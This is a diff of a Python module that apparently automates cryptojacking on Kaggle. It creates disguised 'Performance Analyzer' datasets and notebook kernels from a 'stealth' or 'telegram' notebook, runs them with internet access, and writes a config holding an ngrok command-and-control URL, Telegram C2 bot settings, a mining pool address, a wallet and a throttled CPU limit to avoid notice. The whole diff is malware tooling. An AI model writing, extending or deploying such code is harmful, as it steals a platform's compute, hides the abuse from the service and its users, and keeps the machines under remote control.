@@ -5,6 +5,7 @@ import time
 import json
 import requests
 import subprocess
+from pathlib import Path
 from datetime import datetime
 from typing import Optional, Callable, List
 
@@ -49,11 +50,15 @@ def create_dataset_and_kernel(
             json.dump(kaggle_json, f)
         os.chmod(kaggle_path, 0o600)
         
-        log_fn(f"[DEPLOY] Credentials configured for {username}")
+        log_fn(f"[DEPLOY] ════════════════════════════════════════════════════════")
+        log_fn(f"[DEPLOY] Starting deployment for: {username}")
+        log_fn(f"[DEPLOY] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        log_fn(f"[DEPLOY] ════════════════════════════════════════════════════════")
         
-        # Get C2 URL from config
-        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-        config_path = os.path.join(project_dir, "config.json")
+        # Get C2 URL from config (project root)
+        file_path = Path(__file__).resolve()
+        project_root = file_path.parent.parent.parent  # src/agents/kaggle -> src -> project root
+        config_path = project_root / "config.json"
         c2_url = "https://lynelle-scroddled-corinne.ngrok-free.dev"
         
         if os.path.exists(config_path):
@@ -75,18 +80,36 @@ def create_dataset_and_kernel(
         }
         
         # Write dataset metadata
-        with open(os.path.join(project_dir, "dataset-metadata.json"), "w") as f:
+        with open(project_root / "dataset-metadata.json", "w") as f:
             json.dump(dataset_meta, f, indent=2)
         
-        # Write config.json for dataset
+        # Get Telegram C2 config
+        telegram_bot_token = None
+        telegram_chat_id = None
+        if os.path.exists(config_path):
+            try:
+                with open(config_path) as f:
+                    cfg = json.load(f)
+                    telegram_bot_token = cfg.get("telegram_bot_token")
+                    telegram_chat_id = cfg.get("telegram_chat_id")
+            except: pass
+        
+        # Write config.json for dataset (Telegram C2 priority over ngrok)
         config_data = {
-            "c2_url": c2_url,
+            "c2_url": c2_url,  # Fallback ngrok URL
             "pool": "pool.hashvault.pro:80",
             "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
             "cpu_limit": 25,
             "updated": int(time.time())
         }
-        with open(os.path.join(project_dir, "config.json"), "w") as f:
+        # Add Telegram C2 config if available (preferred over ngrok)
+        if telegram_bot_token and telegram_chat_id:
+            config_data["telegram_bot_token"] = telegram_bot_token
+            config_data["telegram_chat_id"] = telegram_chat_id
+            log_fn(f"[DEPLOY] ✓ Telegram C2 configured: bot_token={telegram_bot_token[:10]}... chat_id={telegram_chat_id}")
+        else:
+            log_fn(f"[DEPLOY] ⚠ No Telegram C2 config, using ngrok fallback: {c2_url}")
+        with open(project_root / "config.json", "w") as f:
             json.dump(config_data, f, indent=2)
         
         log_fn(f"[DEPLOY] Creating dataset: {dataset_slug}")
@@ -97,7 +120,7 @@ def create_dataset_and_kernel(
             kaggle_cmd = "kaggle"
         
         dataset_result = subprocess.run(
-            [kaggle_cmd, "datasets", "create", "-p", project_dir, "--dir-mode", "tar"],
+            [kaggle_cmd, "datasets", "create", "-p", str(project_root), "--dir-mode", "tar"],
             capture_output=True, text=True, timeout=120
         )
         
@@ -107,7 +130,7 @@ def create_dataset_and_kernel(
         else:
             # Try to update existing dataset
             update_result = subprocess.run(
-                [kaggle_cmd, "datasets", "version", "-p", project_dir, "--dir-mode", "tar", "-m", "Update"],
+                [kaggle_cmd, "datasets", "version", "-p", str(project_root), "--dir-mode", "tar", "-m", "Update"],
                 capture_output=True, text=True, timeout=120
             )
             if update_result.returncode == 0 or dataset_result.returncode == 0:
@@ -121,7 +144,7 @@ def create_dataset_and_kernel(
         kernel_slug = f"{username}/perf-analyzer"
         
         # Load notebook
-        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
+        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-telegram.ipynb")
         with open(notebook_path, "r") as f:
             notebook = json.load(f)
         
@@ -214,8 +237,10 @@ def create_dataset_with_machines(
         dataset_slug = f"{username}/perf-analyzer"
         
         # Get current C2 URL from config or use default
-        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-        config_path = os.path.join(project_dir, "config.json")
+        file_path = Path(__file__).resolve()
+        # datasets.py -> kaggle -> agents -> src -> project_root
+        project_root = file_path.parent.parent.parent.parent
+        config_path = project_root / "config.json"
         
         # Load or create config
         c2_url = "https://lynelle-scroddled-corinne.ngrok-free.dev"
@@ -234,6 +259,18 @@ def create_dataset_with_machines(
                         kaggle_api_key = cfg["kaggle_api_key"]
             except: pass
         
+        # Get Telegram C2 config (priority over ngrok) - ALWAYS try to preserve
+        telegram_bot_token = None
+        telegram_chat_id = None
+        if os.path.exists(config_path):
+            try:
+                with open(config_path) as f:
+                    cfg = json.load(f)
+                    telegram_bot_token = cfg.get("telegram_bot_token")
+                    telegram_chat_id = cfg.get("telegram_chat_id")
+                    log_fn(f"[CONFIG] Telegram C2: bot={telegram_bot_token[:10] if telegram_bot_token else 'NONE'}... chat={telegram_chat_id or 'NONE'}")
+            except: pass
+        
         # Use config credentials if available, otherwise use provided
         username = kaggle_username
         api_key = kaggle_api_key
@@ -246,6 +283,13 @@ def create_dataset_with_machines(
             "cpu_limit": 25,
             "updated": int(time.time())
         }
+        # Add Telegram C2 config if available (preferred over ngrok)
+        if telegram_bot_token and telegram_chat_id:
+            config_data["telegram_bot_token"] = telegram_bot_token
+            config_data["telegram_chat_id"] = telegram_chat_id
+            log_fn(f"[DATASET] ✓ Telegram C2 configured: chat_id={telegram_chat_id}")
+        else:
+            log_fn(f"[DATASET] ⚠ No Telegram C2, using ngrok: {c2_url}")
         
         dataset_meta = {
             "title": "Performance Analyzer",
@@ -259,18 +303,19 @@ def create_dataset_with_machines(
         }
         
         # Create dataset directory in project
-        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-        dataset_dir = project_dir  # Use project root directly
+        # dataset_dir should be project root (4 levels up from datasets.py)
+        # datasets.py -> kaggle -> agents -> src -> project_root
+        dataset_dir = file_path.parent.parent.parent.parent
         
         # Dataset files are already in project (src, setup.py, requirements.txt, README.md)
         log_fn(f"[DATASET] Using project files from: {dataset_dir}")
         
         # Write dataset metadata
-        with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
+        with open(dataset_dir / "dataset-metadata.json", "w") as f:
             json.dump(dataset_meta, f, indent=2)
         
         # Write config.json to dataset (auto-updated with current C2 URL)
-        with open(os.path.join(dataset_dir, "config.json"), "w") as f:
+        with open(dataset_dir / "config.json", "w") as f:
             json.dump(config_data, f, indent=2)
         
         log_fn(f"[DATASET] Dataset metadata written")
@@ -323,7 +368,7 @@ def create_dataset_with_machines(
         kernel_slug = f"{username}/perf-analyzer"
         
         # Load notebook from file (stealth version)
-        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
+        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-telegram.ipynb")
         log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
         
         with open(notebook_path, "r") as f:
@@ -420,6 +465,11 @@ def push_kernel_json(
     result = {"success": False, "url": None, "error": None}
     
     try:
+        log_fn(f"[KERNEL] ════════════════════════════════════════════════════════")
+        log_fn(f"[KERNEL] Pushing kernel: {kernel_slug}")
+        log_fn(f"[KERNEL] User: {username}, Title: {title}")
+        log_fn(f"[KERNEL] ════════════════════════════════════════════════════════")
+        
         # Use kagglesdk for kernel creation
         from kagglesdk import KaggleClient
         from kagglesdk.kernels.types.kernels_api_service import ApiSaveKernelRequest
@@ -429,9 +479,11 @@ def push_kernel_json(
         os.environ['KAGGLE_USERNAME'] = username
         os.environ['KAGGLE_KEY'] = api_key
         
+        log_fn(f"[KERNEL] Initializing KaggleClient...")
         client = KaggleClient()
         
         # Create request
+        log_fn(f"[KERNEL] Creating kernel request...")
         request = ApiSaveKernelRequest()
         request.slug = kernel_slug
         request.new_title = title
@@ -451,12 +503,24 @@ def push_kernel_json(
         log_fn(f"[KERNEL] Settings: internet=True, gpu={enable_gpu}")
         
         # Execute
-        response = client.kernels.kernels_api_client.save_kernel(request)
+        log_fn(f"[KERNEL] Calling save_kernel API...")
+        try:
+            response = client.kernels.kernels_api_client.save_kernel(request)
+        except Exception as api_err:
+            if "409" in str(api_err) or "Conflict" in str(api_err):
+                log_fn(f"[KERNEL] Kernel exists, updating...")
+                # Kernel exists - update it (remove new_title for update)
+                request.new_title = None
+                response = client.kernels.kernels_api_client.save_kernel(request)
+            else:
+                raise
         
+        log_fn(f"[KERNEL] API response received, processing...")
         result["success"] = True
         result["url"] = response.url if hasattr(response, 'url') else f"https://www.kaggle.com/code/{kernel_slug}"
-        log_fn(f"[KERNEL] ✓ Pushed with SAVE_AND_RUN_ALL: {kernel_slug}")
+        log_fn(f"[KERNEL] ✓ SUCCESS! Kernel pushed with SAVE_AND_RUN_ALL")
         log_fn(f"[KERNEL]   URL: {result['url']}")
+        log_fn(f"[KERNEL] ════════════════════════════════════════════════════════")
     
     except ImportError as e:
         log_fn(f"[KERNEL] ⚠ kagglesdk not available: {e}")
@@ -468,7 +532,7 @@ def push_kernel_json(
             from pathlib import Path
             
             # Load notebook from file (stealth version)
-            notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
+            notebook_path = os.path.join(os.path.dirname(__file__), "notebook-telegram.ipynb")
             log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
             
             with open(notebook_path, "r") as f:
